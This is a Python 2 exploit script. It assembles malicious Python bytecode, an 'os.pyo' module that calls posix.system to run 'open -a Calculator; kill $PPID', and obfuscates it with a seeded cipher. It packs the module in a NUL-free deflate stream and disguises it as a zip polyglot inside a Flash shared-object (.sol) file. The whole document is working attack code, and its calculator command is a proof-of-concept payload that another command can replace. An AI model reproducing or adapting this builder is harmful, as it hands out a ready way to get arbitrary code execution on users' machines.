import marshal, _random, struct, zlib, random, os, re


def obfuscate(inp, seed):
    lenseed = len(inp)
    lenseed ^= lenseed << 13
    lenseed ^= lenseed >> 17
    lenseed ^= lenseed << 5
    xseed = (0x10dcd * seed + lenseed + 0x6611cb3b) & 0xffffffff
    state = []
    for i in xrange(624):
        #print hex(xseed)
        state.append(xseed)
        xseed ^= xseed >> 30
        xseed = (0x6c078965 * xseed + (i + 1)) & 0xffffffff
    state.append(624)
    r = _random.Random()
    r.setstate(tuple(state))
    rand_long = r.getrandbits(128)
    ose = [(rand_long >> i) & 0xffffffff for i in xrange(0, 128, 32)]
    #print map(hex, ose)

    len_padded = (len(inp) + 0xf) & ~0xf
    len_words = len_padded / 4

    fmt = '<%dI' % len_words
    ary = list(struct.unpack(fmt, inp + '\0' * (len_padded - len(inp))))
    if len_words >= 2:
        diff_target = (0x9e3779b9 * (52 / len_words) - 0x4ab325aa) & 0xffffffff
        diff = 0
        while diff != diff_target:
            diff = (diff - 0x61c88647) & 0xffffffff
            bits = (diff >> 2) & 3
            for k in xrange(len_words):
                m_before = ary[(k + 1) % len_words]
                #print 'm_before: %x' % m_before
                m_after = ary[k]
                read2 = ary[(k - 1) % len_words]

                osew = ose[bits ^ (k & 3)]
                m1 = (((read2 >> 5) ^ (m_before << 2)) + ((m_before >> 3) ^ (read2 << 4))) ^ \
                     ((diff ^ m_before) + (read2 ^ osew))
                read = (m_after + m1) & 0xffffffff
                ary[k] = read

    #print hex(ary[0])
    return struct.pack(fmt, *ary)


def get_pyo_data(seed):
    opc = {
        'IMPORT_NAME': 98,
        'LOAD_ATTR': 96,
        'LOAD_CONST': 82,
        'CALL_FUNCTION': 112,
    }
    names = ('posix', 'system')
    consts = (None, -1, 'open -a Calculator; kill $PPID')
    varnames = ()
    freevars = ()
    cellvars = ()
    lnotab = 'fffff'
    filename = 'fffff'
    name = 'x'
    ops = [
        (opc['LOAD_CONST'], 1),
        (opc['LOAD_CONST'], 0),
        (opc['IMPORT_NAME'], 0),
        (opc['LOAD_ATTR'], 1),
        (opc['LOAD_CONST'], 2),
        (opc['CALL_FUNCTION'], 1),
    ]

    code = ''.join(struct.pack('<BH', *a) for a in ops)

    co = (struct.pack('<IIII',
                      0,  # argcount
                      0,  # nlocals
                      1024,  # stacksize
                      0) +  # flags
          marshal.dumps(code) + marshal.dumps(consts) + marshal.dumps(names) +
          marshal.dumps(varnames) + marshal.dumps(freevars) +
          marshal.dumps(cellvars) + marshal.dumps(filename) +
          marshal.dumps(name) + struct.pack('<I', 123) + marshal.dumps(lnotab))
    #open('/tmp/os.pyo.co', 'wb').write(co)
    obfuscated = obfuscate(co, seed)
    co = 'c' + struct.pack('<II', seed, len(co)) + obfuscated
    data = '\x07\xf3\x0d\x0a****' + co

    return data


def bbin(num, length):
    b = bin(num)[2:]
    assert len(b) <= length
    return b.rjust(length, '0')


def lbin(num, length):
    return bbin(num, length)[::-1]


def nulsafe_deflate(uncompressed):
    # header:
    #  BFINAL
    #  | BTYPE
    #  | |  HLIT   HDIST HCLEN
    #  1 10 10111| 00000 111|1
    #       286-257      18-4

    # our l/l code is:
    #   0              [258]
    #   10x            [256-257]
    #   110xxxxxx      [0-63]
    #   1110xxxxxx     [64-127]
    #   1111xxxxxxx    [128-255]
    #   thus lengths are: 9x64, 10x64, 11x128, 3x2, 1
    #   encoded as: [9], <[16], 6>*10, <[0], 3>
    #               [10], <[16], 6>*10, <[16], 3>
    #               [11], <[16], 6>*21, [11]
    #               [3], [3], [1]
    # our code length code must specify 1, 3, 9-11, 16
    # => * _ _ _ ? _ * _ * _ * _ _ * _ _ _ * (count=18)
    #            ^ specify 8 even though unnecessary
    # | _ *16 ... . | .. ... *8* | ... *9* .. | . *10 ... * | 11 ... ... |
    # | *3* ... ..  | ... *1*
    # 1, 2, 3, 4, 5, 6
    hc = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14,
          1]  # + 15 unencoded

    hdr = '1'  # BFINAL
    hdr += lbin(2, 2)  # BTYPE
    hdr += lbin(259 - 257, 5)  # HLIT
    hdr += lbin(1 - 1, 5)  # HDIST
    hdr += lbin(len(hc) - 4, 4)  # HCLEN
    # code length alphaet code lengths
    clcodes = {1: '0',
               3: '10',
               8: '110',
               9: '1110',
               10: '11110',
               11: '111110',
               16: '111111'}
    for c in hc:
        hdr += lbin(len(clcodes.get(c, '')), 3)
    # l/l alphabet code lengths
    for l in xrange(9, 11):
        hdr += clcodes[l] + (clcodes[16] + lbin(
            6 - 3, 2)) * 10 + clcodes[16] + lbin(3 - 3, 2)
    hdr += clcodes[11] + (clcodes[16] + lbin(6 - 3, 2)) * 21 + clcodes[11]
    hdr += clcodes[3] + clcodes[3] + clcodes[1]
    # distance alphabet code lengths
    hdr += clcodes[1]

    body = ''
    for b in uncompressed:
        b = ord(b)
        if b <= 63:
            body += '110' + bbin(b, 6)
        elif b <= 127:
            body += '1110' + bbin(b - 64, 6)
        else:
            body += '1111' + bbin(b - 128, 7)
    body += '100'  # 256

    data = hdr + body

    split = [data[i:i + 8] for i in xrange(0, len(data), 8)]
    assert '00000000' not in split
    split[-1] += '1' * (-len(split[-1]) & 7)
    #print split
    ret = ''.join(chr(int(x[::-1], 2)) for x in split)

    if True:
        assert '\0' not in ret
        assert zlib.decompress(ret, -15) == uncompressed
    return ret


def get_nulsafe_pyo_data():
    seed = random.randint(0, 2**32 - 1)
    pyo = get_pyo_data(seed)
    compress = zlib.compressobj(random.randint(1, 9), zlib.DEFLATED, -15)
    z = compress.compress(pyo) + compress.flush()
    print [i for i in xrange(len(z)) if z[i] == '\0']


def test_nsd():
    text = os.urandom(128)
    d = nulsafe_deflate(text)
    #print d
    assert '\0' not in d
    assert zlib.decompress(d, -15) == text


def get_zip_template(data, filename):
    #filename = list(filename) + ['\0'] + [None]*12
    len_data = len(data)
    len_fn = len(filename)
    len_lh = 30
    lh_cd_pad = 0
    cd_data_pad = 0
    data_eocd_pad = (-len(data) - 52) & 0xff
    len_cd = 46 + len(filename)
    len_eocd = 22
    pos_lh = 4
    pos_cd = pos_lh + len_lh + lh_cd_pad
    pos_data = pos_cd + len_cd + cd_data_pad
    pos_eocd = pos_data + len_data + data_eocd_pad
    fh_size1 = pos_data - (pos_lh + 30)
    fh_size2 = 0
    pos_filename = pos_cd + 46

    offset_in_eocd = 0x20202020
    offset_in_cd = pos_lh - pos_cd + offset_in_eocd
    size_in_eocd = pos_eocd - pos_cd

    lh = (['\x50', '\x4b', '\x03', '\x04'] + [None] * 22 +
          list(struct.pack('<HH', fh_size1, fh_size2)))
    cd = (['\x50', '\x4b', '\x01', '\x02'] + [None] * 6 + ['\x01', None
                                                           ] +  # compress
          [None] * 8 +  # time, date, crc
          list(struct.pack('<I', len_data)) +  # data_size
          [None] * 4 +  # file_size
          list(struct.pack('<H', len_fn)) +  # name_size
          [None] * 4 +  # extra/comm sizes (used but don't care)
          [None] * 8 +  # ignored
          list(struct.pack('<i', offset_in_cd)) +  # name_size
          list(filename))
    eocd = (
        ['\x50', '\x4b', '\x05', '\x06'] + [None] * 8 +
        list(struct.pack('<ii', size_in_eocd, offset_in_eocd)) + [None] * 2)
    assert len(lh) == len_lh
    assert len(cd) == len_cd
    assert len(eocd) == len_eocd
    assert fh_size1 + fh_size2 == pos_data - (pos_lh + 30)

    bytes = sum(
        [
            [None] * 4, lh, [None] * lh_cd_pad, cd, [None] * cd_data_pad,
            list(data), [None] * data_eocd_pad, eocd
        ], [])
    assert bytes[pos_data] == data[0]
    assert bytes[pos_lh] == lh[0]
    assert bytes[pos_cd] == cd[0]
    assert bytes[pos_eocd] == eocd[0]

    # assume we already started an array
    states = [{} for i in xrange(len(bytes) + 1)]
    states[0]['subkey'] = []

    def may_be(pos, c):
        d = bytes[pos]
        if d is None: return True
        if d != c: return False
        return len(bytes) - 6 <= xpos < len(bytes) - 2 or \
               xpos == len(bytes) - 10

    for xpos in xrange(len(bytes)):
        mybyte = bytes[xpos]
        mystates = states[xpos]

        def try_state(ypos, ystate, xstate, to_append):
            splats = mystates[xstate]
            assert ypos >= xpos + len(to_append)
            if ypos < len(states) and ystate not in states[ypos]:
                if not all(may_be(xpos + i, c)
                           for (i, c) in enumerate(to_append)):
                    return
                states[ypos][ystate] = splats + \
                    [(None, 'note: state %s(%d/0x%x) -> %s(%d/0x%x)' % (xstate, xpos, xpos, ystate, ypos, ypos))] + \
                    [(xpos+i, c) for (i, c) in enumerate(to_append)]

        def try_pstring(ystate, splats, intro, min_len=0):
            spos = xpos + len(intro)
            if spos + 1 < len(bytes):  # and bytes[spos+1] is None:
                for ypos in xrange(spos + 2, len(bytes)):
                    if bytes[ypos] == '\0':
                        break
                    this_len = ypos - (spos + 2)
                    if this_len >= min_len:
                        try_state(ypos, ystate, splats,
                                  intro + struct.pack('>H', this_len))

        if 'subkey' in mystates:
            try_pstring('subkind', 'subkey', '', min_len=1)
            if xpos >= len(bytes) - 20:
                try_state(xpos + 3, 'zero', 'subkey', '\x00\x00\x09')
        if 'subkind' in mystates:
            try_state(xpos + 9, 'subkey', 'subkind', '\x00')
            try_state(xpos + 2, 'subkey', 'subkind', '\x01')
            try_pstring('subkey', 'subkind', '\x02')
        if 'key' in mystates:
            # this isn't quite right because of sorting
            # try_pstring('kind', mystates['key'], '', min_len=2)
            try_state(xpos + 4, 'kind', 'key', '\x00\x02\x08\x07')
        if 'kind' in mystates:
            try_state(xpos + 9, 'zero', 'kind', '\x00')
            try_state(xpos + 2, 'zero', 'kind', '\x01')
            try_pstring('zero', 'kind', '\x02')
        if 'zero' in mystates:
            try_state(xpos + 1, 'key', 'zero', '\x00')
    if False:
        for i, mystates in enumerate(states):
            print i, (repr(bytes[i]) if i < len(bytes) else
                      '<e>'), mystates.keys()
    splats = states[-1]['key']
    print splats
    for pos, c in splats:
        if pos is not None:
            bytes[pos] = c
    sol_end = ''.join('A' if c is None else c for c in bytes)

    def pstr(x):
        return struct.pack('>H', len(x)) + x

    sol_mid = 'TCSO' + struct.pack(
        '>HI', 4,
        0) + pstr('settings') + '\0\0\0\0' + pstr('\x07\x08') + '\x03'
    sol_start = struct.pack('>HI', 0xbf, len(sol_mid) + len(sol_end))
    #sol_start = sol_mid = ''
    sol = sol_start + sol_mid + sol_end

    # oops, should have thought of this
    a, bkey, b, ckey, c = re.split('(\x00\x02\x07\x08|\x00\x02\x08\x07)', sol)
    sol = a + ckey + c + bkey + b

    return sol


aseed = 123
adeflated = nulsafe_deflate(get_pyo_data(aseed))
asol = get_zip_template(adeflated, 'os.pyo')
with open('out.sol', 'wb') as fp:
    fp.write(asol)
